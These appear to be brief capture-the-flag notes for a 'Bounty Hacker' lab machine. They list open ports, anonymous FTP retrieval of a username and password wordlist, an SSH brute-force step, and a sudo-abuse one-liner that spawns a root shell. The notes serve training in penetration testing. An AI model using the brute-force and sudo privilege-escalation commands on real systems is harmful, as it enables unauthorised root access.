# Bounty Hacker 
```
export_ip = 10.10.81.238

[Port]
21 FTP
22 SSH
80 Http

[FTP Enumerate]
1. Allow Anonymous Login
2. get locks.txt, task.txt
-- task.txt
-- -- username : line
-- locks.txt
-- -- password Dictionary.txt

[SSH Enumerate] 
# Reference file : hydraPerform.txt

[Read user.txt]
cat ~/user.txt 

[Privilege]
# sudo -l
1. sudo /bin/ar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'

```